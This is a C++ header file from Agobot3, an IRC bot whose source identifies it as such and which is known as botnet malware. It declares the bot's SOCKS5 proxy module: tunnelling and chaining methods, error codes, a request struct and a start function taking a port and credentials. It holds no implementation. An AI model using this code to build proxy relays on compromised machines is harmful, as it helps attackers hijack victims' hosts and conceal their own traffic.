/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __REDIR_SOCKS5_H__
#define __REDIR_SOCKS5_H__

#include "cstring.h"
#include "redirect.h"
#include "utility.h"

#ifdef _WIN32

#define SOCKS_MODE_TCP	1
#define SOCKS_MODE_UDP	2

#define SOCKS_ERROR_NONE		0x1000
#define	SOCKS_ERROR_SOCKET			(SOCKS_ERROR_NONE+1)
#define SOCKS_ERROR_UNKNOWN_MODE	(SOCKS_ERROR_NONE+2)
#define SOCKS_ERROR_NOTIFY_CALL		(SOCKS_ERROR_NONE+3)
#define SOCKS_ERROR_OPERATING		(SOCKS_ERROR_NONE+4)


#define SOCKS5_MSG_ERROR(x)		"\x05"x"\x00\x01\x7f\x00\x00\x01\x00\x00"
#define SOCKS5_ADDRESS_NOTSUPPORTED	"\x08"
#define SOCKS5_HOST_UNREACHABLE		"\x04"
#define SOCKS5_NETWORK_UNREACHABLE	"\x03"
#define SOCKS5_CONNECTION_UNALLOWED	"\x02"

#define VALID_SOCKET(x)	(x!=INVALID_SOCKET && x!=SOCKET_ERROR)
#ifdef _WIN32
#define closesock(x)	closesocket(x)
#else
#define closesock(x)	close(x)
#endif // _WIN32

class CSocks {
private:
	
public:
	u_short uPort, mode;
	CString m_sUser;
	CString m_sPass;
	u_int uAccept;
	u_long LastError;

	CSocks() {
		uAccept = 0;
		mode = SOCKS_MODE_TCP;
		uPort = 0;
		LastError = SOCKS_ERROR_NONE;
	};

	~CSocks() {
		if(uAccept) closesock(uAccept);
	};

	bool DNSAddrLookup(char* sHost, struct in_addr* addr);
	bool StartChaining();
	bool SocksTCPTunneling(u_int sres, u_int sdest);
	bool SocksUDPTunneling(void* sadest, char* sData, u_int len);
	bool PrepareListening();
	char* GetLastError();
	virtual bool ForceConnection(u_int sock) = 0;
};

class CSocks5:public virtual CSocks{
private:
public:
	CSocks5() {
	};

	~CSocks5() {
	};

	bool ForceConnection(u_int sock);
};

typedef struct tagSOCKS5REQ {
	u_char uVersion, uCommand;
	u_char uReserved;
	u_char uAddrType;
	u_char uDstAddr[256];
	u_short uDstPort;
} SOCKS5REQ, *PSOCKS5REQ;

void StartSocks5(int port, CString username, CString password);
#endif // _WIN32

#endif // __REDIR_SOCKS5_H__
